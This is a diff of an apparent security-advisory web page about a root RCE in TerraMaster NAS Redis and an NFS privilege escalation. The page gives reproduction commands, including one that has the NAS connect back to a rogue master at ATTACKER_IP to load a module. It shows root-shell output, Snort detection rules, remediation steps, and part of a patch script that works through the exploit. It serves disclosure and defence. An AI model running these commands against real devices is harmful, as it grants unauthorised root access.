@@ -407,90 +407,31 @@
 Target:    TerraMaster TOS3_A1.0 4.2.41, Redis 4.0.10, RTD1296 (AArch64)
 Tools:     python3, aarch64-linux-gnu-gcc (for cross-compile), redis-cli
 Ports:     TCP/6379 reachable from attacker; NAS must reach back to attacker
-</code></pre><h3 id="setup-steps">Setup Steps</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> rce
-</span></span><span class="line"><span class="cl">make
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> lpe
-</span></span><span class="line"><span class="cl">make
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="step-by-step-reproduction-rce">Step-by-Step Reproduction (RCE)</h3>
-<ol>
-<li>
-<p><strong>Build the module</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> rce <span class="o">&amp;&amp;</span> make
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Run a single command as root</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rce/poc.py &lt;NAS_IP&gt; --cmd <span class="s2">&#34;id&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Interactive root shell loop</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rce/poc.py &lt;NAS_IP&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>If the NAS cannot route back automatically, specify attacker IP</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rce/poc.py &lt;NAS_IP&gt; --lhost &lt;ATTACKER_IP&gt; --cmd <span class="s2">&#34;id&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-</ol>
-<h3 id="step-by-step-reproduction-lpe">Step-by-Step Reproduction (LPE)</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> lpe
-</span></span><span class="line"><span class="cl">make
-</span></span><span class="line"><span class="cl">sudo ./drop.sh &lt;NAS_IP&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="exploit-code">Exploit Code</h3>
-<blockquote>
-<p>See <code>rce/poc.py</code> and <code>rce/module.c</code> for the RCE; <code>lpe/suid.c</code> and <code>lpe/drop.sh</code> for the LPE.</p></blockquote>
-<h3 id="expected-output">Expected Output</h3>
-<pre tabindex="0"><code>[*] connecting to &lt;NAS_IP&gt;:6379
+</code></pre><h3 id=setup-steps>Setup Steps</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> rce
+</span></span><span class=line><span class=cl>make
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> lpe
+</span></span><span class=line><span class=cl>make
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=proof-of-concept>Proof of Concept</h2><h3 id=step-by-step-reproduction-rce>Step-by-Step Reproduction (RCE)</h3><ol><li><p><strong>Build the module</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> rce <span class=o>&amp;&amp;</span> make
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Run a single command as root</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 rce/poc.py &lt;NAS_IP&gt; --cmd <span class=s2>&#34;id&#34;</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Interactive root shell loop</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 rce/poc.py &lt;NAS_IP&gt;
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>If the NAS cannot route back automatically, specify attacker IP</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 rce/poc.py &lt;NAS_IP&gt; --lhost &lt;ATTACKER_IP&gt; --cmd <span class=s2>&#34;id&#34;</span>
+</span></span></code></pre></td></tr></table></div></div></li></ol><h3 id=step-by-step-reproduction-lpe>Step-by-Step Reproduction (LPE)</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> lpe
+</span></span><span class=line><span class=cl>make
+</span></span><span class=line><span class=cl>sudo ./drop.sh &lt;NAS_IP&gt;
+</span></span></code></pre></td></tr></table></div></div><h3 id=exploit-code>Exploit Code</h3><blockquote><p>See <code>rce/poc.py</code> and <code>rce/module.c</code> for the RCE; <code>lpe/suid.c</code> and <code>lpe/drop.sh</code> for the LPE.</p></blockquote><h3 id=expected-output>Expected Output</h3><pre tabindex=0><code>[*] connecting to &lt;NAS_IP&gt;:6379
 [*] redis_version: 4.0.10
 [*] starting rogue master on &lt;ATTACKER_IP&gt;:&lt;port&gt;
 [*] sent SLAVEOF — waiting for replication
@@ -500,670 +441,453 @@ Ports:     TCP/6379 reachable from attacker; NAS must reach back to attacker
 [+] system.exec ready
 root@&lt;NAS_IP&gt;# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><hr>
-<h2 id="screenshots--evidence">Screenshots / Evidence</h2>
-<!-- None included in upstream source -->
-<hr>
-<h2 id="detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</h2>
-<pre tabindex="0"><code>redis-cli -h &lt;NAS_IP&gt; INFO server | grep tcp_port
+</code></pre><hr><h2 id=screenshots--evidence>Screenshots / Evidence</h2><hr><h2 id=detection--indicators-of-compromise>Detection & Indicators of Compromise</h2><pre tabindex=0><code>redis-cli -h &lt;NAS_IP&gt; INFO server | grep tcp_port
 
 grep -i &#34;slaveof\|module load&#34; /var/log/redis/redis.log
 
 ls -la /tmp/*.so 2&gt;/dev/null
 
 redis-cli MODULE LIST
-</code></pre><p><strong>Network signature:</strong></p>
-<pre tabindex="0"><code>alert tcp any any -&gt; any 6379 (msg:&#34;Redis SLAVEOF to external host&#34;; content:&#34;SLAVEOF&#34;; nocase; sid:9000010;)
+</code></pre><p><strong>Network signature:</strong></p><pre tabindex=0><code>alert tcp any any -&gt; any 6379 (msg:&#34;Redis SLAVEOF to external host&#34;; content:&#34;SLAVEOF&#34;; nocase; sid:9000010;)
 alert tcp any any -&gt; any 6379 (msg:&#34;Redis MODULE LOAD&#34;; content:&#34;MODULE&#34;; nocase; content:&#34;LOAD&#34;; nocase; distance:0; sid:9000011;)
-</code></pre><hr>
-<h2 id="remediation">Remediation</h2>
-<table>
-  <thead>
-      <tr>
-          <th>Action</th>
-          <th>Detail</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>Patch</strong></td>
-          <td>Vendor (TerraMaster) confirmed TOS4 EOL — no fix planned</td>
-      </tr>
-      <tr>
-          <td><strong>Workaround (RCE)</strong></td>
-          <td>Block TCP/6379 from untrusted networks; fix init script to use <code>/etc/redis.conf</code>; require Redis authentication; disable <code>CONFIG</code>, <code>SLAVEOF</code>, <code>MODULE</code> commands</td>
-      </tr>
-      <tr>
-          <td><strong>Workaround (LPE)</strong></td>
-          <td>Add <code>root_squash</code> to NFS exports; avoid writable exports to untrusted clients</td>
-      </tr>
-      <tr>
-          <td><strong>Config Hardening</strong></td>
-          <td>Run Redis as an unprivileged service user; rename or disable dangerous Redis commands</td>
-      </tr>
-  </tbody>
-</table>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://github.com/v12-security/pocs">v12sec TossUp source (v12-security/pocs)</a></li>
-<li><a href="https://redis.io/commands/module-loadex/">Redis MODULE LOAD documentation</a></li>
-<li><a href="https://redis.io/docs/management/replication/">Redis replication protocol</a></li>
-</ul>
-<hr>
-<h2 id="notes">Notes</h2>
-<p>Auto-ingested from v12-pocs/terramaster on 2026-05-18.</p>
-<p>Two separate bugs bundled as &ldquo;TossUp&rdquo;:</p>
-<ol>
-<li>Redis unauthenticated root RCE via replication + module loading (network-exploitable, no credentials).</li>
-<li>NFS <code>no_root_squash</code> LPE (local, independent of the RCE — RCE already runs as root).</li>
-</ol>
-<p>The RCE does not require the LPE; they are independent issues on the same device. Vendor confirmed EOL with no intent to patch. Network isolation (firewall TCP/6379) is the practical first line of defense for affected owners.</p>
-<p>A separate authentication bypass (likely upgradable to RCE) was noted by the researchers but not yet released at time of ingest.</p>
-<p>Discovered autonomously with V12 by Aaron Esau of the V12 security team.</p>
-
-    </div>
-
-    <div class="mt-10 overflow-hidden rounded-lg border border-zinc-700/60 shadow-2xl">
-
-      
-      <div class="flex items-center gap-3 bg-zinc-800 px-3 py-2">
-        
-        <div class="flex shrink-0 items-center gap-1.5">
-          <span class="h-3 w-3 rounded-full bg-red-500"></span>
-          <span class="h-3 w-3 rounded-full bg-yellow-400"></span>
-          <span class="h-3 w-3 rounded-full bg-green-500"></span>
-        </div>
-        
-        <div class="flex flex-1 justify-center">
-          <div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1">
-            <span class="h-2.5 w-2.5 shrink-0 rounded-sm" style="background-color:#3b82f6"></span>
-            <span class="font-mono text-xs text-zinc-200">patch.py</span>
-          </div>
-        </div>
-        
-        <div class="flex shrink-0 items-center gap-2">
-          <span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
-          <a href="/pocs/network/2026-05-18_tossup-terramaster-redis-rce/patch.py" target="_blank" rel="noopener"
-             class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
-          <a href="/pocs/network/2026-05-18_tossup-terramaster-redis-rce/patch.py" download="patch.py"
-             class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a>
-        </div>
-      </div>
-
-      <div class="poc-viewer overflow-x-auto">
-        <div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span><span class="lnt">152
-</span><span class="lnt">153
-</span><span class="lnt">154
-</span><span class="lnt">155
-</span><span class="lnt">156
-</span><span class="lnt">157
-</span><span class="lnt">158
-</span><span class="lnt">159
-</span><span class="lnt">160
-</span><span class="lnt">161
-</span><span class="lnt">162
-</span><span class="lnt">163
-</span><span class="lnt">164
-</span><span class="lnt">165
-</span><span class="lnt">166
-</span><span class="lnt">167
-</span><span class="lnt">168
-</span><span class="lnt">169
-</span><span class="lnt">170
-</span><span class="lnt">171
-</span><span class="lnt">172
-</span><span class="lnt">173
-</span><span class="lnt">174
-</span><span class="lnt">175
-</span><span class="lnt">176
-</span><span class="lnt">177
-</span><span class="lnt">178
-</span><span class="lnt">179
-</span><span class="lnt">180
-</span><span class="lnt">181
-</span><span class="lnt">182
-</span><span class="lnt">183
-</span><span class="lnt">184
-</span><span class="lnt">185
-</span><span class="lnt">186
-</span><span class="lnt">187
-</span><span class="lnt">188
-</span><span class="lnt">189
-</span><span class="lnt">190
-</span><span class="lnt">191
-</span><span class="lnt">192
-</span><span class="lnt">193
-</span><span class="lnt">194
-</span><span class="lnt">195
-</span><span class="lnt">196
-</span><span class="lnt">197
-</span><span class="lnt">198
-</span><span class="lnt">199
-</span><span class="lnt">200
-</span><span class="lnt">201
-</span><span class="lnt">202
-</span><span class="lnt">203
-</span><span class="lnt">204
-</span><span class="lnt">205
-</span><span class="lnt">206
-</span><span class="lnt">207
-</span><span class="lnt">208
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">patch.py — Exploit TerraMaster TOS Redis RCE to patch both vulnerabilities.
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Bug 1 (RCE): /etc/init.d/redis is a symlink to /usr/sbin/desh, which runs
-</span></span></span><span class="line"><span class="cl"><span class="s2">             /etc/init.d/redis.en — an encrypted script that starts
-</span></span></span><span class="line"><span class="cl"><span class="s2">             &#34;redis-server 0.0.0.0:6379&#34;, ignoring /etc/redis.conf (which
-</span></span></span><span class="line"><span class="cl"><span class="s2">             already has &#34;bind 127.0.0.1&#34;).
-</span></span></span><span class="line"><span class="cl"><span class="s2">Fix:         Replace the desh symlink with a proper init script that starts
-</span></span></span><span class="line"><span class="cl"><span class="s2">             redis-server with /etc/redis.conf.  Ensure daemonize yes is set.
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Bug 2 (LPE): /etc/exports has no_root_squash on NFS exports.
-</span></span></span><span class="line"><span class="cl"><span class="s2">Fix:         Replace no_root_squash with root_squash and re-export.
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Usage:
-</span></span></span><span class="line"><span class="cl"><span class="s2">    python3 patch.py &lt;NAS_IP&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">    python3 patch.py &lt;NAS_IP&gt; --lhost &lt;ATTACKER_IP&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s2">    python3 patch.py &lt;NAS_IP&gt; --no-restart
-</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">SCRIPT_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">SCRIPT_DIR</span><span class="p">,</span> <span class="s2">&#34;rce&#34;</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">poc</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">poc</span> <span class="kn">import</span> <span class="p">(</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Progress</span><span class="p">,</span> <span class="n">deliver_module</span><span class="p">,</span> <span class="n">redis_load_module</span><span class="p">,</span> <span class="n">redis_exec</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">redis_cmd</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="n">good</span><span class="p">,</span> <span class="n">warn</span><span class="p">,</span> <span class="n">bail</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">REDIS_INIT</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;</span><span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">#!/bin/sh
-</span></span></span><span class="line"><span class="cl"><span class="s2"># Patched by patch.py — uses /etc/redis.conf instead of hardcoded 0.0.0.0:6379
-</span></span></span><span class="line"><span class="cl"><span class="s2">DAEMON=/usr/bin/redis-server
-</span></span></span><span class="line"><span class="cl"><span class="s2">CONF=/etc/redis.conf
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">case &#34;$1&#34; in
-</span></span></span><span class="line"><span class="cl"><span class="s2">  start)
-</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;$DAEMON&#34; &#34;$CONF&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">    ;;
-</span></span></span><span class="line"><span class="cl"><span class="s2">  stop)
-</span></span></span><span class="line"><span class="cl"><span class="s2">    redis-cli shutdown nosave 2&gt;/dev/null || killall redis-server 2&gt;/dev/null
-</span></span></span><span class="line"><span class="cl"><span class="s2">    ;;
-</span></span></span><span class="line"><span class="cl"><span class="s2">  restart|reload)
-</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;$0&#34; stop
-</span></span></span><span class="line"><span class="cl"><span class="s2">    sleep 1
-</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;$0&#34; start
-</span></span></span><span class="line"><span class="cl"><span class="s2">    ;;
-</span></span></span><span class="line"><span class="cl"><span class="s2">  *)
-</span></span></span><span class="line"><span class="cl"><span class="s2">    echo &#34;Usage: $0 {start|stop|restart}&#34; &gt;&amp;2
-</span></span></span><span class="line"><span class="cl"><span class="s2">    exit 1
-</span></span></span><span class="line"><span class="cl"><span class="s2">    ;;
-</span></span></span><span class="line"><span class="cl"><span class="s2">esac
-</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Execute a shell command on the target via system.exec.&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redis_exec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_remote</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Write a text file on the target via base64-encoded echo.&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;echo &#39;</span><span class="si">{</span><span class="n">b64</span><span class="si">}</span><span class="s2">&#39; | base64 -d &gt; </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">mode</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;chmod </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">patch_redis</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Replace the desh-encrypted Redis init script with one that honours
-</span></span></span><span class="line"><span class="cl"><span class="s2">    /etc/redis.conf, and ensure the config has daemonize yes.&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- verify the config already binds to localhost ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">bind_line</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;grep &#39;^bind &#39; /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;127.0.0.1&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">bind_line</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/etc/redis.conf bind is not 127.0.0.1: </span><span class="si">{</span><span class="n">bind_line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;redis.conf bind verified: </span><span class="si">{</span><span class="n">bind_line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- ensure daemonize yes (stock config ships &#39;daemonize no&#39;) ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">daemonize</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;grep &#39;^daemonize &#39; /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;yes&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">daemonize</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="s2">&#34;Setting daemonize yes in /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;sed -i &#39;s/^daemonize .*/daemonize yes/&#39; /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">verify</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;grep &#39;^daemonize &#39; /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;yes&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">verify</span><span class="p">:</span>
